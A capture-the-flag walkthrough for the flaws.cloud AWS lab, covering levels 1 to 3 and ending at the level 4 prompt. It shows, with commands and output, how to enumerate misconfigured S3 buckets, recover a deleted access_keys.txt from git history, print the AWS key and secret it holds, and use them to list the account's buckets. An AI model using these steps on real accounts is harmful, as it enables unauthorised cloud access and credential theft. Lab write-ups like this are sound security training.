# FLAWS

## Project Source
```
http://flaws.cloud/
```

## Solutions
### Level 1
This level is *buckets* of fun. See if you can find the first sub-domain.

```
% nslookup flaws.cloud
Server:		2600:4040:7c97:eb00::1
Address:	2600:4040:7c97:eb00::1#53

Non-authoritative answer:
Name:	flaws.cloud
Address: 52.218.216.147

% nslookup 52.218.216.147
Server:		2600:4040:7c97:eb00::1
Address:	2600:4040:7c97:eb00::1#53

Non-authoritative answer:
147.216.218.52.in-addr.arpa	name = s3-website-us-west-2.amazonaws.com.
```

Attempting to access S3 bucket with the following URL: `https://flaws.cloud.s3.amazonaws.com/`

```
<snip>
<Contents>
<Key>secret-dd02c7c.html</Key>
<LastModified>2017-02-27T01:59:30.000Z</LastModified>
<ETag>"c5e83d744b4736664ac8375d4464ed4c"</ETag>
<Size>1051</Size>
<StorageClass>STANDARD</StorageClass>
</Contents>
</ListBucketResult>
```

#### Lesson Learned
- AWS S3 bucket permission was set to "Everyone"


### Level 2
Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud

The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.

---
The level 2 URL (`https://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s3.amazonaws.com/`) was a location for another S3 bucket; however, it was not available to anonymous users. So I had to configure my `aws` CLI with the free tier account and access the S3 bucket via AWS CLI

```
% aws configure
Access Key:
Secret Access Key:
Region:
Format:
```

Now, I could access the S3 bucket.

```
% aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/
2017-02-26 21:02:15      80751 everyone.png
2017-03-02 22:47:17       1433 hint1.html
2017-02-26 21:04:39       1035 hint2.html
2017-02-26 21:02:14       2786 index.html
2017-02-26 21:02:14         26 robots.txt
2017-02-26 21:02:15       1051 secret-e4443fc.html
```

Using `cp` option, I downloaded the `secret-e4443fc.html` to my local box

```
% aws s3 cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html .
```

Now I got the URL for the Level 3

```
% cat secret-e4443fc.html
<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
            :not(center) > pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000;
            border-width: 1px; border-style: solid;}
        </style>
    </head>
<body
  text="#00d000"
  bgcolor="#000000"
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">

<center>
<pre >
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>


Level 3 is at <a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</a>
```

#### Lesson Learned
- AWS S3 bucket permission was set to "Any Authenticated AWS User"

### Level 3

The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.

--- 
This sounds like I might need to find a hidden file. I used `--recursive` option and found a bunch of files in .git folder.

```
% aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ --recursive --human-readable --summari
ze
2017-09-17 11:12:24   52 Bytes .git/COMMIT_EDITMSG
2017-09-17 11:12:24   23 Bytes .git/HEAD
2017-09-17 11:12:24  130 Bytes .git/config
2017-09-17 11:12:24   73 Bytes .git/description
2017-09-17 11:12:24  452 Bytes .git/hooks/applypatch-msg.sample
2017-09-17 11:12:24  896 Bytes .git/hooks/commit-msg.sample
2017-09-17 11:12:24  189 Bytes .git/hooks/post-update.sample
2017-09-17 11:12:24  398 Bytes .git/hooks/pre-applypatch.sample
2017-09-17 11:12:24    1.7 KiB .git/hooks/pre-commit.sample
2017-09-17 11:12:24    4.8 KiB .git/hooks/pre-rebase.sample
2017-09-17 11:12:24    1.2 KiB .git/hooks/prepare-commit-msg.sample
2017-09-17 11:12:24    3.5 KiB .git/hooks/update.sample
2017-09-17 11:12:24  600 Bytes .git/index
2017-09-17 11:12:24  240 Bytes .git/info/exclude
2017-09-17 11:12:24  359 Bytes .git/logs/HEAD
2017-09-17 11:12:24  359 Bytes .git/logs/refs/heads/master
2017-09-17 11:12:24  679 Bytes .git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
2017-09-17 11:12:24  770 Bytes .git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df
2017-09-17 11:12:25  820 Bytes .git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c
2017-09-17 11:12:25  245 Bytes .git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b
2017-09-17 11:12:25  109.4 KiB .git/objects/76/e4934c9de40e36f09b4e5538236551529f723c
2017-09-17 11:12:25  560 Bytes .git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c
2017-09-17 11:12:25  191 Bytes .git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
2017-09-17 11:12:25   42 Bytes .git/objects/c2/aab7e03933a858d1765090928dca4013fe2526
2017-09-17 11:12:25  904 Bytes .git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2
2017-09-17 11:12:25   98 Bytes .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
2017-09-17 11:12:25  279 Bytes .git/objects/f2/a144957997f15729d4491f251c3615d508b16a
2017-09-17 11:12:25  125 Bytes .git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
2017-09-17 11:12:25   41 Bytes .git/refs/heads/master
2017-02-26 19:14:33  120.7 KiB authenticated_users.png
2017-02-26 19:14:34    1.5 KiB hint1.html
2017-02-26 19:14:34    1.4 KiB hint2.html
2017-02-26 19:14:35    1.2 KiB hint3.html
2017-02-26 19:14:33    1.0 KiB hint4.html
2020-05-22 14:21:10    1.8 KiB index.html
2017-02-26 19:14:33   26 Bytes robots.txt

Total Objects: 36
   Total Size: 256.6 KiB
```

I used the following `sync` command to copy all the files into my local box for further enumeration.

```
% aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .
```

Within the .git folder, `git log` showed logs of the git commits.

```
% git log
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

When I did the `checkout` command, I got the following error:

```
% git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
fatal: this operation must be run in a work tree
```

So, I had to specify the work tree to the current path.

```
% git --work-tree=/tmp/aws/level3/.git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
D	access_keys.txt
D	authenticated_users.png
D	hint1.html
D	hint2.html
D	hint3.html
D	hint4.html
D	index.html
D	robots.txt
HEAD is now at f52ec03 first commit
```

`access_keys.txt` was found and it disclose AWS access keys.

```
% cat access_keys.txt
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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
```

Setting a new AWS profile with the found cred

```
% aws configure --profile level4
AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key [None]: 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
Default region name [None]:
Default output format [None]: json
```

```
% aws --profile level4 s3 ls
2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 12:34:53 config-bucket-975426262029
2017-02-12 15:03:24 flaws-logs
2017-02-04 22:40:07 flaws.cloud
2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

#### Lesson Learned
- Leaked AWS credentials. 

### Level 4

For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.

